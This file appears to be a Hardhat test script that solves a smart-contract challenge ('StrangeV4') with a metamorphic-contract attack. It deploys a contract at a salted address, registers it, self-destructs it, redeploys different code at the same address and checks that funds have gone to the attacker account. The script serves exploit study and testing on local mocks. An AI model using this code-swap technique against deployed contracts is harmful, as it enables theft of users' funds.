const hre = require("hardhat");
const fs = require("fs");
const {parseEther} = require("ethers/lib/utils");
const {getBalances} = require("@nomicfoundation/hardhat-chai-matchers/internal/misc/balance");
const {expect} = require("chai");
// fs.readFileSync("./json/data.json", "utf8");
const contractOneABI = JSON.parse(fs.readFileSync("./artifacts/contracts/MetamorphicPattern/mock/ContractOne.sol/ContractOne.json", "utf8"));
const contractTwoABI = JSON.parse(fs.readFileSync("./artifacts/contracts/MetamorphicPattern/mock/ContractTwo.sol/ContractTwo.json", "utf8"));
const contractThreeABI = JSON.parse(fs.readFileSync("./artifacts/contracts/MetamorphicPattern/mock/ContractThree.sol/ContractThree.json", "utf8"));

describe("", () => {
    let deployer,user1;
    describe("", () => {
        before("Before Metamorphic Test", async () => {
            [deployer, user1] = await hre.ethers.getSigners();

        })


        it("", async () => {

            let MetamorphicContractFactory = await hre.ethers.getContractFactory("MetamorphicContractFactory");
            const metamorphicContractFactory = await MetamorphicContractFactory.deploy("0x608060405260603373ffffffffffffffffffffffffffffffffffffffff166357b9f5236040518163ffffffff1660e01b815260040160006040518083038186803b15801561004c57600080fd5b505afa158015610060573d6000803e3d6000fd5b505050506040513d6000823e3d601f19601f82011682018060405250602081101561008a57600080fd5b8101908080516401000000008111156100a257600080fd5b828101905060208101848111156100b857600080fd5b81518560018202830111640100000000821117156100d557600080fd5b505092919050505090506000816020018251808234f092505050600073ffffffffffffffffffffffffffffffffffffffff168173ffffffffffffffffffffffffffffffffffffffff16141561012957600080fd5b8073ffffffffffffffffffffffffffffffffffffffff16fffe")

            let stringer4Contract = await (await hre.ethers.getContractFactory("StrangeV4")).deploy({value: parseEther("1")});
            const salt = "0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266000000000000000000000007";

            const tnx1 = await metamorphicContractFactory.connect(deployer).deployMetamorphicContract(salt, contractOneABI.bytecode, "0x")
            const receipt = await tnx1.wait();

            let metamorphicContract = receipt.events[0].args.metamorphicContract

            const tnx2 = await stringer4Contract.connect(deployer).initialize(metamorphicContract);
            await tnx2.wait();

            const attachedContractOne = await hre.ethers.getContractAt("ContractOne", metamorphicContract)
            await attachedContractOne.destroy();

            const tnx3 = await metamorphicContractFactory.connect(deployer).deployMetamorphicContract(salt, contractTwoABI.bytecode, "0x")
            await tnx3.wait();

            metamorphicContract = (await tnx1.wait()).events[0].args.metamorphicContract
            let balance0ETH = await hre.ethers.provider.getBalance(deployer.address);

            const tnx4 = await stringer4Contract.connect(user1).success(metamorphicContract);
            await tnx4.wait();

            expect(parseInt(await hre.ethers.provider.getBalance(user1.address), 10)).to.be.gt(10000000000000000000000)

        })

    })
})
